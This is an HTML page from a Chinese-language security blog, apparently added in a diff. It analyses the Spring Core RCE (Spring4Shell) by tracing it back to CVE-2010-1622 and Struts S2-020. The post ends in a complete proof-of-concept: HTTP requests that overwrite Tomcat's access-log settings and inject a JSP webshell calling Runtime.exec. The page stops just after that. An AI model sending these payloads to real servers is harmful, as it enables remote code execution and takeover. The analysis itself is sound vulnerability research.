@@ -1,0 +1,543 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+  <title>Spring Core RCE - Even - A super concise theme for Hugo</title>
+  <meta name="renderer" content="webkit" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+<meta name="theme-color" content="#f8f5ec" />
+<meta name="msapplication-navbutton-color" content="#f8f5ec">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">
+
+
+<meta name="author" content="" /><meta name="description" content="Intro 前段时间的Spring-core RCE传的沸沸扬扬，自己分析完之后觉得并没有pr的那么“核弹”，反而觉得漏洞利用范围其实挺窄的，随着官方修" /><meta name="keywords" content="Hugo, theme, even" />
+
+
+
+
+
+
+<meta name="generator" content="Hugo 0.101.0 with theme even" />
+
+
+<link rel="canonical" href="http://localhost:1313/post/spring-core-rce/" />
+<link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+<link rel="manifest" href="/manifest.json">
+<link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5">
+
+
+
+<link href="/sass/main.min.b874a8796a492f0d7c86bb24c33cbf052935783a5778ebaf819a8e514bf49f10.css" rel="stylesheet">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.1.20/dist/jquery.fancybox.min.css" integrity="sha256-7TyXnr2YU040zfSP+rEcz29ggW4j56/ujTPwjMzyqFY=" crossorigin="anonymous">
+
+
+<meta property="og:title" content="Spring Core RCE" />
+<meta property="og:description" content="Intro 前段时间的Spring-core RCE传的沸沸扬扬，自己分析完之后觉得并没有pr的那么“核弹”，反而觉得漏洞利用范围其实挺窄的，随着官方修" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://localhost:1313/post/spring-core-rce/" /><meta property="article:section" content="post" />
+<meta property="article:published_time" content="2022-04-01T23:30:57+08:00" />
+<meta property="article:modified_time" content="2022-04-01T23:30:57+08:00" />
+
+<meta itemprop="name" content="Spring Core RCE">
+<meta itemprop="description" content="Intro 前段时间的Spring-core RCE传的沸沸扬扬，自己分析完之后觉得并没有pr的那么“核弹”，反而觉得漏洞利用范围其实挺窄的，随着官方修"><meta itemprop="datePublished" content="2022-04-01T23:30:57+08:00" />
+<meta itemprop="dateModified" content="2022-04-01T23:30:57+08:00" />
+<meta itemprop="wordCount" content="2576">
+<meta itemprop="keywords" content="Java安全,漏洞分析," /><meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Spring Core RCE"/>
+<meta name="twitter:description" content="Intro 前段时间的Spring-core RCE传的沸沸扬扬，自己分析完之后觉得并没有pr的那么“核弹”，反而觉得漏洞利用范围其实挺窄的，随着官方修"/>
+
+<!--[if lte IE 9]>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js"></script>
+<![endif]-->
+
+<!--[if lt IE 9]>
+  <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
+<![endif]-->
+
+</head>
+<body>
+  <div id="mobile-navbar" class="mobile-navbar">
+  <div class="mobile-header-logo">
+    <a href="/" class="logo">Whoami</a>
+  </div>
+  <div class="mobile-navbar-icon">
+    <span></span>
+    <span></span>
+    <span></span>
+  </div>
+</div>
+<nav id="mobile-menu" class="mobile-menu slideout-menu">
+  <ul class="mobile-menu-list">
+    <a href="/">
+        <li class="mobile-menu-item">Home</li>
+      </a><a href="/post/">
+        <li class="mobile-menu-item">Archives</li>
+      </a><a href="/tags/">
+        <li class="mobile-menu-item">Tags</li>
+      </a><a href="/about/">
+        <li class="mobile-menu-item">About</li>
+      </a>
+  </ul>
+
+  
+
+
+</nav>
+
+  <div class="container" id="mobile-panel">
+    <header id="header" class="header">
+        <div class="logo-wrapper">
+  <a href="/" class="logo">Whoami</a>
+</div>
+
+
+
+
+
+<nav class="site-navbar">
+  <ul id="menu" class="menu">
+    <li class="menu-item">
+        <a class="menu-item-link" href="/">Home</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="/post/">Archives</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="/tags/">Tags</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="/about/">About</a>
+      </li>
+  </ul>
+</nav>
+
+    </header>
+
+    <main id="main" class="main">
+      <div class="content-wrapper">
+        <div id="content" class="content">
+          <article class="post">
+    
+    <header class="post-header">
+      <h1 class="post-title">Spring Core RCE</h1>
+
+      <div class="post-meta">
+        <span class="post-time"> 2022-04-01 </span>
+        
+        
+      </div>
+    </header>
+
+    <div class="post-toc" id="post-toc">
+  <h2 class="post-toc-title">Contents</h2>
+  <div class="post-toc-content always-active">
+    <nav id="TableOfContents">
+  <ul>
+    <li>
+      <ul>
+        <li><a href="#intro">Intro</a></li>
+        <li><a href="#cve-2010-1622">CVE-2010-1622</a></li>
+        <li><a href="#structs-s2-020">Structs S2-020</a></li>
+        <li><a href="#spring-core-rce">Spring-core RCE</a></li>
+        <li><a href="#fix">Fix</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+  </div>
+</div>
+    <div class="post-content">
+      <h2 id="intro">Intro</h2>
+<p>前段时间的Spring-core RCE传的沸沸扬扬，自己分析完之后觉得并没有pr的那么“核弹”，反而觉得漏洞利用范围其实挺窄的，随着官方修复的更新，这个漏洞的分析终于可以发出来了。</p>
+<p>这篇文章并不想做机械的调试分析，所以不会深入每一个细节，但是会将历史上一些相似的漏洞拿出来作为拼图，最后拼出一个完整的POC。</p>
+<p>这个 0day 本质上是对 <a href="http://rui0.cn/archives/1158">CVE-2010-1622</a> 的绕过，结合了 <a href="https://cloud.tencent.com/developer/article/1035297">Structs S2-020</a> 的利用方式，完成对 Tomcat 控制 Access 日志的 <code>AccessLogValve</code> 类的变量覆盖，控制日志文件的文件名、后缀、路径和内容，达到向 web 目录写 shell 的目的。</p>
+<p>JavaBean 的一般规范就是成员变量用 <code>private</code> 修饰，然后选择性的设置相应的 <code>setter/getter</code> 方法。除了比较熟悉的 <code>Commons-BeanUtils</code> 之外， Spring 中也封装了一套操作 Bean 的类，主要实现在 <code>org.springframework.beans.BeanWrapperImpl</code> 中，它是根据 Bean 中的 <code>setter/getter</code> 方法判断是否存在对应的属性，这就会导致一个问题：如果 Bean 中存在一个 <code>getFoo()/setFoo(Foo foo)</code> 方法，但是却没有对应的属性 <code>foo</code> ，Spring 还是会认为 Bean 存在一个 <code>foo</code> 属性，并通过 <code>getFoo()</code> 方法获取它的值。看下面这个例子：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="nd">@Test</span>
+</span></span><span class="line"><span class="cl"><span class="kd">public</span> <span class="kt">void</span> <span class="nf">BeanWrapperTest</span><span class="o">()</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl"> 	 <span class="n">BeanWrapperImpl</span> <span class="n">beanWrapper</span> <span class="o">=</span> <span class="k">new</span> <span class="n">BeanWrapperImpl</span><span class="o">(</span><span class="k">new</span> <span class="n">User</span><span class="o">());</span>
+</span></span><span class="line"><span class="cl"> 	 <span class="n">Arrays</span><span class="o">.</span><span class="na">stream</span><span class="o">(</span><span class="n">beanWrapper</span><span class="o">.</span><span class="na">getPropertyDescriptors</span><span class="o">()).</span><span class="na">forEach</span><span class="o">(</span><span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">::</span><span class="n">println</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl"><span class="o">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// ############
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl"><span class="n">org</span><span class="o">.</span><span class="na">springframework</span><span class="o">.</span><span class="na">beans</span><span class="o">.</span><span class="na">GenericTypeAwarePropertyDescriptor</span><span class="o">[</span><span class="n">name</span><span class="o">=</span><span class="n">alias</span><span class="o">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">org</span><span class="o">.</span><span class="na">springframework</span><span class="o">.</span><span class="na">beans</span><span class="o">.</span><span class="na">GenericTypeAwarePropertyDescriptor</span><span class="o">[</span><span class="n">name</span><span class="o">=</span><span class="n">class</span><span class="o">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">org</span><span class="o">.</span><span class="na">springframework</span><span class="o">.</span><span class="na">beans</span><span class="o">.</span><span class="na">GenericTypeAwarePropertyDescriptor</span><span class="o">[</span><span class="n">name</span><span class="o">=</span><span class="n">id</span><span class="o">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">org</span><span class="o">.</span><span class="na">springframework</span><span class="o">.</span><span class="na">beans</span><span class="o">.</span><span class="na">GenericTypeAwarePropertyDescriptor</span><span class="o">[</span><span class="n">name</span><span class="o">=</span><span class="n">name</span><span class="o">]</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>即使 <code>User</code> 这个类中没有 <code>class</code> 属性，还是 <code>BeanWrapperImpl</code> 还是获取到了，原因在于所有类都会继承 <code>Object</code> ，而 <code>Object</code> 中有个方法为 <code>getClass()</code> 。</p>
+<p>Spring 中有一个特性叫做「变量绑定」，简单来说就是前端传入 Bean 的属性，后端可以自动实例化 Bean ，然后根据传入的属性为其赋值：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"> <span class="nd">@RequestMapping</span><span class="o">(</span><span class="s">&#34;/hello&#34;</span><span class="o">)</span>
+</span></span><span class="line"><span class="cl"> <span class="kd">public</span> <span class="n">String</span> <span class="nf">fooBind</span><span class="o">(</span><span class="n">Model</span> <span class="n">model</span><span class="o">,</span> <span class="n">User</span> <span class="n">user</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"> 	 <span class="n">model</span><span class="o">.</span><span class="na">addAttribute</span><span class="o">(</span><span class="s">&#34;user&#34;</span><span class="o">,</span> <span class="n">user</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl"> 	 <span class="n">model</span><span class="o">.</span><span class="na">addAttribute</span><span class="o">(</span><span class="s">&#34;name&#34;</span><span class="o">,</span> <span class="n">user</span><span class="o">.</span><span class="na">getName</span><span class="o">());</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"> 	 <span class="k">return</span> <span class="s">&#34;hello&#34;</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"> <span class="o">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// #############
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">POST</span> <span class="n">id</span><span class="o">=</span><span class="n">1</span><span class="o">&amp;</span><span class="n">name</span><span class="o">=</span><span class="n">bar</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>在绑定的过程里，自然要操纵 Bean 为相应的属性赋值，这个过程在 <code>org.springframework.validation.DataBinder#bind</code> 方法中。</p>
+<p>在这个过程中会引发一个变量覆盖的问题，这也是 CVE-2010-1622 和本漏洞的利用方式，简单来说，如果要对普通类型的属性赋值，必须存在 <code>setter</code> 方法才能赋值成功，否则就会抛出异常，但是如果属性的类型是 <code>Array | List | Map</code> 的话，就是直接操作 <code>getter</code> 方法返回的值，所以如果可以保证 <code>getter</code> 方法返回的值是类中的属性的一个引用（对象引用，而不是一个 <code>clone</code> 或产生新的对象），那么就会造成变量覆盖。</p>
+<p>举例来说，我们给 <code>User</code> 加入一个 <code>String[]</code> 类型的属性，并且只有 <code>getter</code> 方法：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">public</span> <span class="kd">class</span> <span class="nc">User</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">	<span class="kd">private</span> <span class="kt">int</span> <span class="n">id</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">	<span class="kd">private</span> <span class="n">String</span> <span class="n">name</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">	<span class="kd">private</span> <span class="n">String</span><span class="o">[]</span> <span class="n">alias</span> <span class="o">=</span> <span class="k">new</span> <span class="n">String</span><span class="o">[]{</span><span class="s">&#34;Bob&#34;</span><span class="o">};</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="c1">// setter &amp; getter ...
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">	<span class="kd">public</span> <span class="n">String</span><span class="o">[]</span> <span class="nf">getAlias</span><span class="o">()</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">		 <span class="k">return</span> <span class="n">alias</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">	<span class="o">}</span>
+</span></span><span class="line"><span class="cl"><span class="o">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>传入 <code>alias[0]=Tom</code> ，随后输出一下结果：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"> <span class="nd">@RequestMapping</span><span class="o">(</span><span class="s">&#34;/hello&#34;</span><span class="o">)</span>
+</span></span><span class="line"><span class="cl"> <span class="nd">@ResponseBody</span>
+</span></span><span class="line"><span class="cl"> <span class="kd">public</span> <span class="n">String</span> <span class="nf">fooBind</span><span class="o">(</span><span class="n">Model</span> <span class="n">model</span><span class="o">,</span> <span class="n">User</span> <span class="n">user</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl"> 	 <span class="k">return</span> <span class="n">Arrays</span><span class="o">.</span><span class="na">toString</span><span class="o">(</span><span class="n">user</span><span class="o">.</span><span class="na">getAlias</span><span class="o">());</span>
+</span></span><span class="line"><span class="cl"> <span class="o">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// ############
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">[</span><span class="n">Tom</span><span class="o">]</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>此外，Spring 还支持属性的嵌套，要进行参数绑定的 Bean 会作为 <code>Root Object</code> ，可以通过传入下面这样的参数，来操作属性的属性：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">class.classLaoder
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Spring 收到这样的参数之后，会引入一个 <code>Wrapped Object</code> ， 这个对象就是上一个 <code>Wrapped Object</code> 调用 <code>getXXX()</code> 获取的结果，<code>Root Object</code> 是初始的 <code>Wrapped Object</code>，上面的传入的参数就会变成如下的方法调用：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">user.getClass().getclassLoader()
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="cve-2010-1622">CVE-2010-1622</h2>
+<p>回到 CVE-2010-1622 中，这个漏洞的 Payload 如下：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">class.classLoader.URLs[0]=jar:http://127.0.0.1:8000/sp-exp.jar!/
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>结合上面提到的 Spring 特性，很容易发现条 Payload 是覆盖 <code>classLoader</code> 的 <code>URLs</code> 数组中的第一个 <code>URL</code> 。
+在 SpringMVC 环境（更普遍来说，是以War包部署在Tomcat上的Spring应用）下，由于应用需要部署到 Tomcat 上，所以这里的 <code>classLoader</code> 是 Tomcat 中的 <code>WebAppClassLoader</code> ，它继承了 <code>URLClassLoader</code> ，在 Tomcat 6.0.28 之前，它的 <code>getURLs()</code> 方法会直接返回成员变量 <code>repositoryURLs</code> 的<strong>引用</strong>，所以这里有了可以变量覆盖的可能：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">public</span> <span class="n">URL</span><span class="o">[]</span> <span class="nf">getURLs</span><span class="o">(){</span>
+</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">repositoryURLs</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">		<span class="k">return</span> <span class="k">this</span><span class="o">.</span><span class="na">repositoryURls</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">	<span class="o">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="c1">//...
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>关于覆盖完 <code>URLs</code> 之后的利用步骤，不是本文的重点，漏洞爆出之后，Spring 做了这样的修复，如果 <code>Wrapped Object</code> 的类型是 <code>java.lang.Class</code> ，且属性名为 <code>classLoader</code> 的时候，就会直接 continue，不将属性放入 <code>cache</code> 中，下面这段代码的在 <code>CachedIntrospectionResults</code> 的构造方法中：</p>
+<p><img src="https://image-1302577725.cos.ap-beijing.myqcloud.com/uPic/Pasted%20image%2020220331155527.png" alt="img"></p>
+<p>这样就可以在数据绑定的过程中禁止了对 <code>Class</code> 类的 <code>classLoader</code> 属性的获取 ，同时 Tomcat 也进行了修复，将 <code>getURLs()</code> 方法的返回结果改成了 <code>repositoryURLs</code> 的 <code>clone</code> ，也就无法直接修改该属性了：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">public</span> <span class="n">URL</span><span class="o">[]</span> <span class="nf">getURLs</span><span class="o">(){</span>
+</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">repositoryURLs</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">		<span class="k">return</span> <span class="k">this</span><span class="o">.</span><span class="na">repositoryURls</span><span class="o">.</span><span class="na">clone</span><span class="o">();</span>
+</span></span><span class="line"><span class="cl">	<span class="o">}</span>
+</span></span><span class="line"><span class="cl">	<span class="c1">//...
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="structs-s2-020">Structs S2-020</h2>
+<p>在 Structs S2-020 这个洞里面，同样是变量覆盖（这个洞是用 OGNL 表达式进行覆盖），它的利用方式是修改 Tomcat 的日志文件配置，向 web 目录中写入 WebShell ：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">class.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT
+</span></span><span class="line"><span class="cl">class.classLoader.resources.context.parent.pipeline.first.prefix=shell
+</span></span><span class="line"><span class="cl">class.classLoader.resources.context.parent.pipeline.first.suffix=.jsp
+</span></span><span class="line"><span class="cl">class.classLoader.resources.context.parent.pipeline.first.fileDateFormat=1
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>通过 <code>class.classLoader...first</code> 获取到的对象是 <code>AccessLogValve</code> 的实例，它是 Tomcat 中的 Access 日志的配置类，其中几个成员变量（这些属性都有相应的 <code>setter</code> 方法）：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">- directory: 控制日志文件的存储路径
+</span></span><span class="line"><span class="cl">- prefix: 日志文件的文件名
+</span></span><span class="line"><span class="cl">- suffix: 日志文件的后缀名
+</span></span><span class="line"><span class="cl">- fileDateFormat: 日志时间的格式化方式
+</span></span><span class="line"><span class="cl">- pattern: 日志内容的格式化方式，具有丰富的格式化方式
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>对于具体的介绍，可以参考 <a href="https://tomcat.apache.org/tomcat-8.0-doc/config/valve.html">官方文档</a> 。</p>
+<p>所以 Payload 中对于 <code>directory</code> ，<code>prefix</code> ，<code>suffix</code>  三个属性的覆盖，就可以把日志文件修改成一个 jsp 文件，然后将其放到 <code>webapps/ROOT</code> 目录中（日志文件的目录 <code>logs</code> 与 web 目录 <code>webapps</code> 同级），通过访问下面的这样一个路径，将 WebShell 写入日志文件中：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://localhost:8000/foo/&lt;%Runtime.getRuntime().exec(&#34;open -a calculator.app&#34;);%&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>那么为什么要修改 <code>fileDateFormat</code> 呢，看起来似乎与写入 shell 没有关系，但其实只有修改了它才会触发日志文件的重新生成，每次记日志的时候，都会判断当前的时间格式方式和之前的是否相同，如果不相同，就会在 <code>dircetory</code> 指定的目录下重新生成日志文件 ，具体逻辑在 <code>org.apache.catalina.valves.AccessLogValve#rotate()</code> 方法中。</p>
+<h2 id="spring-core-rce">Spring-core RCE</h2>
+<p>我们把前面两个洞的利用方式综合一下，就可以写出这个 0day 的 POC 了，即通过 Spring 数据绑定的时候对 Bean 处理的特性，覆盖 <code>AccessLogValve</code> 中的变量，完成 webshell 的写入。但是在此之前还有一个问题，Spring 禁止了对 <code>Class</code> 类的 <code>classLoader</code> 属性的获取，所以得找到一个 <code>Class</code> 类的其他属性，且这个属性需要有 <code>getClassLoader()</code> 方法，并返回其 <code>classLoder</code> 的引用，才能 Bypass 这个 Spring 的黑名单。</p>
+<p>JDK9 之后引入了「模块化」的概念，每个 <code>Class</code> 对象都会有一个 <code>module</code> 属性，来表示自己属于哪个模块，每次类加载的时候，类加载器都会判断要加载的类的模块，如果可以找到它对应模块的类加载器，就会委派给模块的类加载器加载，而不是直接委托给父加载器。
+<code>module</code> 属性的类是 <code>java.lang.Module</code> ，正好有符合条件的 <code>getClassLoader()</code> 方法：</p>
+<p><img src="https://image-1302577725.cos.ap-beijing.myqcloud.com/uPic/Pasted%20image%2020220331165833.png" alt="Pasted image 20220331165833"></p>
+<p>在 Tomcat 的环境下，<code>class.getModule().getClassLoader()</code> 获取的依然是 <code>WebAppClassLoader</code> ，所以现在万事俱备，通过下面的属性嵌套就能完成对 <code>AcessLogValve</code> 的覆盖：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">class.module.resources.context.parent.pipeline.first.directory=webapps/ROOT
+</span></span><span class="line"><span class="cl">...
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>完整的 POC 为：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">###  
+</span></span><span class="line"><span class="cl">POST http://localhost:8000/hello  
+</span></span><span class="line"><span class="cl">Content-Type: application/x-www-form-urlencoded  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">class.module.classLoader.resources.context.parent.pipeline.first.prefix=vul&amp;
+</span></span><span class="line"><span class="cl">class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&amp;
+</span></span><span class="line"><span class="cl">class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=1&amp;
+</span></span><span class="line"><span class="cl">class.module.classLoader.resources.context.parent.pipeline.first.directory=/Users/jin/Desktop/WorkSpace/projects/springmvc-rce-demo/src/main/webapp&amp;
+</span></span><span class="line"><span class="cl">class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25{vul}i(%22open%20-a%20calculator.app%22)%3B%25{vul2}i&gt;  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">###  
+</span></span><span class="line"><span class="cl">GET http://localhost:8000/hello?id=99  
+</span></span><span class="line"><span class="cl">Accept: application/json  
+</span></span><span class="line"><span class="cl">vul: &lt;%Runtime.getRuntime().exec  
+</span></span><span class="line"><span class="cl">vul2: %
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>在实际的环境中，<code>logs</code> 目录与 <code>webapps</code> 目录同级，所以 <code>directory</code> 可以设置成 <code>webapps/ROOT</code> 。</p>
+<p>对于这个 POC ，有几个要说明的点：</p>
+<ul>
+<li>在本地 Tomcat8 的环境下，不能直接访问类似于 Struts20 的一个带 webshell 的路径，这样的话日志中会记录 <code>&lt; % &quot;</code> 这些字符的 URL 编码，导致代码不能被解析。</li>
+<li>也不能直接在 <code>pattern</code> 中传入一句话，因为这样会不符合日志中 <code>pattern</code> 的规范，导致解码失败，无法覆盖 <code>pattern</code> 属性。</li>
+<li><code>%{xxx}i</code> 这种格式化方式可以获取请求头中 <code>xxx</code> 字段的值，而这些请求字段中的 <code>&lt; %</code> 这类字符可以不用编码直接传输，也会被完完整整地记录在日志文件中，这样就可以解决URL编码的问题。</li>
+</ul>
+<p>再发送完第一个 POST 包之后，再发送第二个带恶意字段的 GET 包，服务端就可以写入一个 webshell ：</p>
